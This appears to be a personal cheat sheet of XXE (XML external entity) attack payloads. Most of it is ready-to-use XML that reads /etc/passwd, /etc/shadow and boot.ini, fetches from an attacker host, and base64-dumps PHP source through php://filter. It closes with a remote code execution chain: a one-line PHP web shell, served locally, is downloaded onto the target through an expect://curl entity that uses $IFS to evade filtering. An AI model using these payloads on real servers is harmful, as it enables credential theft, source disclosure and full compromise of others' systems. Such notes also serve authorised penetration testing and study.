<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
&xxe

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://domainname.com"> %xxe; ]>

<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>


XXE-----------------
**Local File Disclosure**
 So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an tool -> https://www.convertjson.com/json-to-xml.htm
 
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

**Reading Source Code (onl with PHP applications)**
<!ENTITY company SYSTEM "file:///index.php"> DOESNT work!! but ....
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">

**Remote Code Execution with XXE**
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80

<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>





